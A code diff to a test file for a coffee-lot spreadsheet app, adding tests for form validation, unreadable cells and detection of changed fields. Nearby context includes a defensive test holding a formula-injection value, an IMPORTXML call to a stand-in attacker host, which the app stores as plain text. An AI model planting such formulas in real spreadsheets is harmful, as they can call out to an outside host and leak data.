@@ -2,8 +2,10 @@ import { describe, expect, it } from 'vitest';
 import { SAFETY_COLUMNS } from '../../core/records';
 import { columnsOf } from '../../schema';
 import {
+  FORM_COLUMNS,
   LOTS_TAB,
   LOT_COLUMNS,
+  changedFields,
   countryCode,
   emptyLotForm,
   formFromLot,
@@ -264,6 +266,40 @@ describe('validateLotForm', () => {
   it('stores a formula-looking text as plain text (Kraken writes RAW, so it never runs)', () => {
     const result = validateLotForm(form({ notes: '=IMPORTXML("http://evil.example")' }), []);
     expect(result.ok && result.fields.notes).toBe('=IMPORTXML("http://evil.example")');
+  });
+});
+
+describe('editing a lot with an unreadable cell', () => {
+  it('shows the cell as typed, so saving never wipes it, and the form check asks to correct it', () => {
+    const broken = lot({ coffee_price_net_pln: '4500,555', quantity_kg: 'sixty' });
+    const f = formFromLot(broken);
+    expect(f.coffeePrice).toBe('4500,555');
+    expect(f.quantityKg).toBe('sixty');
+    const result = validateLotForm(f, []);
+    expect(result.ok ? {} : Object.keys(result.errors)).toEqual(['quantityKg', 'coffeePrice']);
+  });
+});
+
+describe('changedFields', () => {
+  it('returns only the stored values of fields the user changed', () => {
+    const original = lot({ code: 'kenya-26-11', name: 'Kenya Kegwa ' }); // typed by hand in the sheet
+    const initial = formFromLot(original);
+    const edited = { ...initial, supplier: 'New Supplier' };
+    const result = validateLotForm(edited, []);
+    if (!result.ok) throw new Error('should be valid');
+    expect(changedFields(initial, edited, result.fields)).toEqual({ supplier: 'New Supplier' });
+  });
+
+  it('stores the tidied value of a changed field', () => {
+    const initial = formFromLot(lot());
+    const edited = { ...initial, code: 'kenya 26 11 b', coffeePrice: '4 600,00' };
+    const result = validateLotForm(edited, []);
+    if (!result.ok) throw new Error('should be valid');
+    expect(changedFields(initial, edited, result.fields)).toEqual({ code: 'KENYA-26-11-B', coffee_price_net_pln: '4600' });
+  });
+
+  it('maps every form field to a Lots column', () => {
+    expect(Object.values(FORM_COLUMNS).every((column) => (LOT_COLUMNS as readonly string[]).includes(column))).toBe(true);
   });
 });
 
